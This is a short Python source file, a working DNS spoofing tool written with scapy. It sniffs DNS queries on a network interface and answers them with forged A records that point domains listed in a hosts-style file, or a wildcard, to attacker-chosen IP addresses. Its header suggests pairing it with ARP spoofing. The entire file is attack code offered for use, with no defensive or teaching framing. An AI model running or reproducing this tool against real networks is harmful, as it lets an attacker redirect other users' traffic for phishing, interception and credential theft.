# -*- coding:utf-8 -*-
#
# A simple DNS spoofing script
# It's batter with ARP-Spoofing
# and delete the local hosts file
# at same time.
# The hosts-file like this:
# 123.12.23.121 www.google.com
# 
# by  s0nnet


import sys
import getopt
import scapy.all as scapy

dev = "eth0"
filter = "udp port 53"
file = None
dns_map = {}

def handle_packet(packet):
    ip = packet.getlayer(scapy.IP)
    udp = packet.getlayer(scapy.UDP)
    dns = packet.getlayer(scapy.DNS)


    # standard (a record) dns query
    if dns.qr == 0 and dns.opcode == 0:
        queried_host = dns.qd.qname[:-1]
        resolved_ip = None

        if dns_map.get(queried_host):
            resolved_ip = dns_map.get(queried_host)
        elif dns_map.get('*'):
            resolved_ip = dns_map.get('*')
        
        if resolved_ip:
            dns_answer = scapy.DNSRR(rrname=queried_host + '.',
                                     ttl = 330,
                                     type="A",
                                     rclass="IN",
                                     rdata=resolved_ip)
            dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
                    scapy.UDP(sport=udp.dport,dport=udp.sport) / \
                    scapy.DNS(
                        id = dns.id,
                        qr = 1,
                        aa = 0,
                        rcode = 0,
                        qd = dns.qd,
                        an = dns_answer
                    )
            print "Send %s has %s to %s" % (queried_host,resolved_ip,ip.src)
            scapy.send(dns_reply, iface=dev)

def usage():
    print sys.argv[0] + ' -f <hosts-file>  -i <dev>'
    sys.exit(1)

def parse_host_file(file):
    for line in open(file):
        line  = line.rstrip('\n')

        if line:
            (ip, host) = line.split()
            dns_map[host] = ip

try:
    cmd_opts = 'f:i:'
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == '-i':
        dev = opt[1]
    elif opt[0] == '-f':
        file = opt[1]
    else:
        usage()

if file:
    parse_host_file(file)
else:
    usage()

print "Spoofing DNS requests on %s" % dev
scapy.sniff(iface=dev, filter=filter, prn=handle_packet)
